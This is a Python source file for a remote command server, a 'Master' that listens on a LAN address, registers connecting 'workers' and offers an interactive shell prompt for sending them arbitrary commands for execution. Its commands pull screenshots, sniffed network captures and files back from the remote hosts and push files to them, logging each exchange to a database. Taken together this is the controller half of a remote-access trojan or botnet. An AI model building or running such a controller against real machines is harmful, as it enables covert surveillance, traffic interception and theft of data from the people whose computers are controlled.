import shlex, threading, sqlite3, socket, sys, os
from operator import truediv
from server_http import Server
from api import API
from request import Request
from response import Response
from datetime import datetime
from db import insert_message



IP = "192.168.68.54"
PORT = 9999

Address = tuple[str, int]
ID = int
class Master:
    def __init__(self):
        self._workers = {}   # worker_id -> {"conn", "addr", "name"}
        self._workers_lock = threading.Lock()
        self._next_id = 1

    def add_worker(self, conn, addr):
        with self._workers_lock:
            worker_id = self._next_id
            self._next_id += 1
            self._workers[worker_id] = {
                "conn": conn,
                "addr": addr,
                "name": f"Worker-{worker_id}",
            }
        return worker_id

    def remove_worker(self, worker_id) -> bool:
        with self._workers_lock:
            worker = self._workers.pop(worker_id, None)
            if worker:
                try:
                    worker["conn"].sendall(
                        Request(method="POST", uri="/exec", body=b"exit").dump()
                    )
                except OSError:
                    pass
                try:
                    worker["conn"].close()
                    return True
                except OSError:
                    return False
            return False

    def get_worker(self, worker_id):
        with self._workers_lock:
            return self._workers.get(worker_id)

    def list_workers(self) -> tuple[ID, str, Address]:
        with self._workers_lock:
            return [
                (cid, info["name"], info["addr"])
                for cid, info in self._workers.items()
            ]

    def rename_worker(self, worker_id, name):
        with self._workers_lock:
            if worker_id in self._workers:
                self._workers[worker_id]["name"] = name
                return True
            return False

def log_message(sender, recipient, worker_ip, message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {sender} -> {recipient}: {message}")
    insert_message(sender, recipient, worker_ip, message, timestamp)

def recv_all(sock):
    raw = b""
    while True:
        raw += sock.recv(4096)
        if not raw:
            return None
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break
    return raw

def send_command(master: Master, worker_id: int, cmd: str, sender="Master"):
    worker = master.get_worker(worker_id)
    if not worker:
        print(f"[!] No worker with ID {worker_id}")
        return False
    if cmd.startswith("move") and shlex.split(cmd)[5] == "worker":
        move_file_to_worker(worker, cmd, sender)
        return True
    else:
        worker["conn"].sendall(Request(method="POST", uri="/exec", body=cmd.encode()).dump())
        log_message(sender, worker["name"], worker["addr"][0], cmd)
        raw = recv_all(worker["conn"])
        response = Response.load(raw)

        if cmd.startswith("screenshot") and cmd.split()[2] == "master":
            path = cmd.split()[1]
            with open(path, "wb") as f:
                f.write(response.body)
            print(f"screenshot saved to {path}")
            return True

        elif cmd.startswith("sniff") and shlex.split(cmd)[5] == "master":
            path = shlex.split(cmd)[4]
            with open(path, "wb") as f:
                f.write(response.body)
            print(f"pcap saved to {path}")
            return True

        elif cmd.startswith("move") and shlex.split(cmd)[5] == "master":
            path = shlex.split(cmd)[7]
            with open(path, "wb") as f:
                f.write(response.body)
            print(f"file from client saved to {path}")
            return True

        else:
            print(response.body.decode(errors="replace"))
            return True

def move_file_to_worker(worker, cmd: str, sender="Master"):
    parts = shlex.split(cmd)
    source_path = parts[1]
    destination_path = parts[7]
    with open(source_path, "rb") as f:
        file_bytes = f.read()
    req = Request(method="POST", uri="/exec", headers={"X-Destination-Path": [destination_path]},
    body=file_bytes)
    worker["conn"].sendall(req.dump())
    log_message(sender, worker["name"], worker["addr"][0], f"pushed file from {source_path} to {destination_path}")
    os.remove(source_path)

def accept_workers(server_socket, master: Master):
    """Runs in its own thread; just registers new workers as they connect."""
    while True:
        try:
            conn, addr = server_socket.accept()
        except OSError:
            break
        worker_id = master.add_worker(conn, addr)
        print(f"\n[+] Worker {worker_id} connected from {addr}\n> ", end="", flush=True)

def print_help():
    print(
        """
Actions:
  list                    show connected workers
  send <id> <message>     send a command to a specific worker
  rename <id> <name>      give a worker a friendly name
  remove <id>             remove a worker
  help                    show this help
  quit                    shut down the server
"""
    )

def actions_loop(master: Master):
    print_help()
    while True:
        try:
            cmd = input("shell> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down.")
            sys.exit(0)

        if not cmd:
            continue

        parts = cmd.split(maxsplit=2)
        action = parts[0].lower()

        if action == "list":
            workers = master.list_workers()
            if not workers:
                print("No workers connected.")
            for cid, name, addr in workers:
                print(f"  [{cid}] {name} - {addr}")

        elif action == "send":
            if len(parts) < 3:
                print("Usage: send <id> <message>")
                continue
            try:
                worker_id = int(parts[1])
            except ValueError:
                print("worker ID must be a number.")
                continue
            send_command(master, worker_id, parts[2])

        elif action == "rename":
            if len(parts) < 3:
                print("Usage: rename <id> <name>")
                continue
            try:
                worker_id = int(parts[1])
            except ValueError:
                print("worker ID must be a number.")
                continue
            if master.rename_worker(worker_id, parts[2]):
                print(f"Worker {worker_id} renamed to {parts[2]}")
            else:
                print(f"No worker with ID {worker_id}")

        elif action == "remove":
            if len(parts) < 2:
                print("Usage: remove <id>")
                continue
            try:
                worker_id = int(parts[1])
            except ValueError:
                print("worker ID must be a number.")
                continue
            if master.get_worker(worker_id):
                master.remove_worker(worker_id)
                print(f"Worker {worker_id} removed.")
            else:
                print(f"No worker with ID {worker_id}")

        elif action == "help":
            print_help()

        elif action == "quit":
            print("Shutting down server.")
            sys.exit(0)

        else:
            print(f"Invalid action: {action} (type 'help' for a list)")

def main():
    master = Master()
    server = Server(api=API())
    server.open((IP, PORT))
    server.connection.listen()
    print(f"[*] Listening on {IP}:{PORT}")
    t1 = threading.Thread(target=accept_workers, args=(server.connection, master), daemon=True)
    t1.start()
    actions_loop(master)

if __name__ == "__main__":
    main()




